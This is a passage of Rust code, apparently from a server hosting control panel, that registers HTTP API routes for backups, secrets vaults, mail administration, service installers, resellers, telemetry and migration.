        .route("/api/backup-orchestrator/db-backups/{id}/restore", post(backup_orchestrator::restore_db_backup))
        .route("/api/backup-orchestrator/volume-backup", post(backup_orchestrator::create_volume_backup))
        .route("/api/backup-orchestrator/volume-backups", get(backup_orchestrator::list_volume_backups))
        .route("/api/backup-orchestrator/volume-backups/{id}/restore", post(backup_orchestrator::restore_volume_backup))
        .route("/api/backup-orchestrator/verify", post(backup_orchestrator::trigger_verify))
        .route("/api/backup-orchestrator/verifications", get(backup_orchestrator::list_verifications))
        .route("/api/backup-orchestrator/drill", post(backup_orchestrator::trigger_drill))
        .route("/api/backup-orchestrator/drills", get(backup_orchestrator::list_drills))
        .route("/api/backup-orchestrator/chain-report/{kind}/{id}", get(backup_orchestrator::chain_report_json))
        .route("/api/backup-orchestrator/chain-report/{kind}/{id}/pdf", get(backup_orchestrator::chain_report_pdf))
        .route("/api/backup-orchestrator/storage-history", get(backup_orchestrator::storage_history))
        // Webhook Gateway
        .route("/api/webhook-gateway/endpoints", get(webhook_gateway::list_endpoints).post(webhook_gateway::create_endpoint))
        .route("/api/webhook-gateway/endpoints/{id}", put(webhook_gateway::set_endpoint_enabled).delete(webhook_gateway::delete_endpoint))
        .route("/api/webhook-gateway/endpoints/{id}/deliveries", get(webhook_gateway::list_deliveries))
        .route("/api/webhook-gateway/endpoints/{id}/routes", get(webhook_gateway::list_routes).post(webhook_gateway::create_route))
        .route("/api/webhook-gateway/routes/{route_id}", put(webhook_gateway::set_route_enabled).delete(webhook_gateway::delete_route))
        .route("/api/webhook-gateway/deliveries/{delivery_id}/replay", post(webhook_gateway::replay_delivery))
        // IaC / Terraform provider
        .route("/api/iac/tokens", get(iac::list_tokens).post(iac::create_token))
        .route("/api/iac/tokens/{id}", delete(iac::delete_token))
        .route("/api/iac/resources/sites", get(iac::tf_list_sites))
        .route("/api/iac/resources/databases", get(iac::tf_list_databases))
        // Auto-scaling
        .route("/api/autoscale", get(iac::list_autoscale).post(iac::create_autoscale))
        .route("/api/autoscale/{id}", put(iac::update_autoscale).delete(iac::delete_autoscale))
        // WHMCS billing integration
        .route("/api/whmcs/config", get(whmcs::get_config).put(whmcs::update_config).delete(whmcs::delete_config))
        .route("/api/whmcs/webhook", post(whmcs::webhook))
        .route("/api/whmcs/services", get(whmcs::list_services))
        // App migration between servers
        .route("/api/migrations/apps", get(whmcs::list_migrations).post(whmcs::start_migration))
        .route("/api/migrations/apps/{id}", get(whmcs::migration_status))
        // Secrets Manager
        .route("/api/secrets/vaults", get(secrets::list_vaults).post(secrets::create_vault))
        .route("/api/secrets/vaults/{vault_id}", delete(secrets::delete_vault).put(secrets::update_vault))
        .route("/api/secrets/vaults/{vault_id}/secrets", get(secrets::list_secrets).post(secrets::create_secret))
        .route("/api/secrets/vaults/{vault_id}/secrets/{secret_id}", put(secrets::update_secret).delete(secrets::delete_secret))
        .route("/api/secrets/vaults/{vault_id}/secrets/{secret_id}/versions", get(secrets::list_versions))
        .route("/api/secrets/vaults/{vault_id}/inject/{site_id}", post(secrets::inject_to_site))
        .route("/api/secrets/vaults/{vault_id}/pull", get(secrets::pull))
        .route("/api/secrets/vaults/{vault_id}/export", get(secrets::export_vault))
        .route("/api/secrets/vaults/{vault_id}/import", post(secrets::import_vault))
        // Incident Management
        .route("/api/incidents", get(incidents::list).post(incidents::create))
        // Static segment, so matchit prefers it over `{id}` whatever the order here.
        .route("/api/incidents/summary", get(incidents::summary))
        .route("/api/incidents/{id}", get(incidents::get_one).put(incidents::update).delete(incidents::remove))
        .route("/api/incidents/{id}/updates", get(incidents::list_updates).post(incidents::post_update))
        // Status Page Management
        .route("/api/status-page/config", get(incidents::get_config).put(incidents::update_config))
        .route("/api/status-page/components", get(incidents::list_components).post(incidents::create_component))
        .route("/api/status-page/components/{id}", delete(incidents::delete_component))
        .route("/api/status-page/subscribers", get(incidents::list_subscribers))
        // Dashboard Intelligence
        .route("/api/dashboard/intelligence", get(dashboard::intelligence))
        .route("/api/dashboard/metrics-history", get(dashboard::metrics_history))
        .route("/api/dashboard/gpu-metrics-history", get(dashboard::gpu_metrics_history))
        .route("/api/dashboard/docker", get(dashboard::docker_summary))
        .route("/api/dashboard/timeline", get(dashboard::timeline))
        .route("/api/dashboard/fleet", get(dashboard::fleet_overview))
        // Live metrics WebSocket
        .route("/api/ws/metrics", get(ws_metrics::handler))
        // Prometheus `/metrics` scrape endpoint (gated by scrape token)
        .route("/api/metrics", get(prometheus::scrape))
        .route("/api/prometheus/settings", get(prometheus::get_settings).post(prometheus::update_settings))
        // SSH Keys
        .route("/api/ssh-keys", get(system::list_ssh_keys).post(system::add_ssh_key))
        .route("/api/ssh-keys/{fingerprint}", delete(system::remove_ssh_key))
        // Auto-Updates
        .route("/api/auto-updates/status", get(system::auto_updates_status))
        .route("/api/auto-updates/enable", post(system::enable_auto_updates))
        .route("/api/auto-updates/disable", post(system::disable_auto_updates))
        // Service installers
        .route("/api/services/install-status", get(system::install_status))
        .route("/api/services/install/php", post(system::install_php))
        .route("/api/services/install/certbot", post(system::install_certbot))
        .route("/api/services/install/ufw", post(system::install_ufw))
        .route("/api/services/install/fail2ban", post(system::install_fail2ban))
        .route("/api/services/install/powerdns", post(system::install_powerdns))
        .route("/api/services/install/redis", post(system::install_redis))
        .route("/api/services/install/nodejs", post(system::install_nodejs))
        .route("/api/services/install/composer", post(system::install_composer))
        .route("/api/services/install/sshpass", post(system::install_sshpass))
        .route("/api/services/install/waf", post(system::install_waf))
        .route("/api/services/install/cloudflared", post(system::install_cloudflared))
        .route("/api/services/install/{install_id}/log", get(system::install_log))
        // Service uninstallers
        .route("/api/services/uninstall/php", post(system::uninstall_php))
        .route("/api/services/uninstall/certbot", post(system::uninstall_certbot))
        .route("/api/services/uninstall/ufw", post(system::uninstall_ufw))
        .route("/api/services/uninstall/fail2ban", post(system::uninstall_fail2ban))
        .route("/api/services/uninstall/powerdns", post(system::uninstall_powerdns))
        .route("/api/services/uninstall/redis", post(system::uninstall_redis))
        .route("/api/services/uninstall/nodejs", post(system::uninstall_nodejs))
        .route("/api/services/uninstall/composer", post(system::uninstall_composer))
        .route("/api/services/uninstall/waf", post(system::uninstall_waf))
        .route("/api/services/uninstall/cloudflared", post(system::uninstall_cloudflared))
        // Mail
        .route("/api/mail/status", get(mail::mail_status))
        .route("/api/mail/install", post(mail::mail_install))
        .route("/api/mail/uninstall", post(mail::mail_uninstall))
        .route("/api/mail/domains", get(mail::list_domains).post(mail::create_domain))
        .route("/api/mail/domains/{id}", put(mail::update_domain).delete(mail::delete_domain))
        .route("/api/mail/domains/{id}/dns", get(mail::domain_dns))
        .route("/api/mail/domains/{id}/accounts", get(mail::list_accounts).post(mail::create_account))
        .route("/api/mail/domains/{id}/accounts/{account_id}", put(mail::update_account).delete(mail::delete_account))
        .route("/api/mail/domains/{id}/aliases", get(mail::list_aliases).post(mail::create_alias))
        .route("/api/mail/domains/{id}/aliases/{alias_id}", delete(mail::delete_alias))
        .route("/api/mail/queue", get(mail::get_queue))
        .route("/api/mail/queue/flush", post(mail::flush_queue))
        .route("/api/mail/queue/{queue_id}", delete(mail::delete_queued))
        // Mail: Rspamd spam filter
        .route("/api/mail/rspamd/install", post(mail::rspamd_install))
        .route("/api/mail/rspamd/status", get(mail::rspamd_status))
        .route("/api/mail/rspamd/toggle", post(mail::rspamd_toggle))
        // Mail: Webmail (Roundcube)
        .route("/api/mail/webmail/install", post(mail::webmail_install))
        .route("/api/mail/webmail/status", get(mail::webmail_status))
        .route("/api/mail/webmail/remove", post(mail::webmail_remove))
        // Mail: SMTP Relay
        .route("/api/mail/relay/configure", post(mail::relay_configure))
        .route("/api/mail/relay/status", get(mail::relay_status))
        .route("/api/mail/relay/remove", post(mail::relay_remove))
        // Mail: DNS Verification
        .route("/api/mail/domains/{id}/dns-check", get(mail::dns_check))
        .route("/api/mail/domains/{id}/preflight", get(mail::preflight))
        // Mail: Logs & Storage
        .route("/api/mail/logs", get(mail::mail_logs))
        .route("/api/mail/storage", get(mail::mail_storage))
        // Mail: Blacklist/Reputation Check
        .route("/api/mail/blacklist-check", get(mail::blacklist_check))
        // Mail: Rate Limiting
        .route("/api/mail/rate-limit/set", post(mail::rate_limit_set))
        .route("/api/mail/rate-limit/status", get(mail::rate_limit_status))
        .route("/api/mail/rate-limit/remove", post(mail::rate_limit_remove))
        // Mail: Backup/Restore
        .route("/api/mail/backup", post(mail::mailbox_backup))
        .route("/api/mail/restore", post(mail::mailbox_restore))
        .route("/api/mail/backups", get(mail::mailbox_backups))
        .route("/api/mail/backups/delete", post(mail::mailbox_backup_delete))
        // Mail: TLS Enforcement
        .route("/api/mail/tls/status", get(mail::tls_status))
        .route("/api/mail/tls/enforce", post(mail::tls_enforce))
        // Traefik Reverse Proxy
        .route("/api/traefik/install", post(system::traefik_install))
        .route("/api/traefik/uninstall", post(system::traefik_uninstall))
        .route("/api/traefik/status", get(system::traefik_status))
        // Agent Diagnostics proxy
        .route("/api/agent/diagnostics", get(system::diagnostics))
        .route("/api/agent/diagnostics/fix", post(system::diagnostics_fix))
        .route("/api/agent/recommendations", get(system::recommendations))
        // System Logs (admin)
        .route("/api/system-logs", get(system_logs::list))
        .route("/api/system-logs/count", get(system_logs::count))
        // Reseller Management (admin)
        .route("/api/resellers", get(resellers::list).post(resellers::create))
        .route("/api/resellers/{id}", get(resellers::get).put(resellers::update).delete(resellers::remove))
        .route("/api/resellers/{id}/servers", get(resellers::list_servers).post(resellers::allocate_server))
        .route("/api/resellers/{id}/servers/{server_id}", delete(resellers::deallocate_server))
        // Reseller Dashboard
        .route("/api/reseller/dashboard", get(reseller_dashboard::dashboard))
        .route("/api/reseller/users", get(reseller_dashboard::list_users).post(reseller_dashboard::create_user))
        .route("/api/reseller/users/{id}", put(reseller_dashboard::update_user).delete(reseller_dashboard::delete_user))
        .route("/api/reseller/servers", get(reseller_dashboard::list_servers))
        // Activity (admin)
        .route("/api/activity", get(activity::list))
        // Telemetry & Updates (admin)
        .route("/api/telemetry/events", get(telemetry::list_events).delete(telemetry::clear_events))
        .route("/api/telemetry/stats", get(telemetry::stats))
        .route("/api/telemetry/config", get(telemetry::get_config).put(telemetry::update_config))
        .route("/api/telemetry/preview", get(telemetry::preview))
        .route("/api/telemetry/export", get(telemetry::export_report))
        .route("/api/telemetry/send", post(telemetry::send_now))
        .route("/api/telemetry/update-status", get(telemetry::update_status))
        .route("/api/telemetry/check-updates", post(telemetry::check_updates))
        // Migration Wizard
        .route("/api/migration/analyze", post(migration::analyze))
        .route("/api/migration", get(migration::list))
        .route("/api/migration/{id}", get(migration::get_one).delete(migration::remove))
        .route("/api/migration/{id}/import", post(migration::import))
        .route("/api/migration/{id}/progress", get(migration::progress))
}
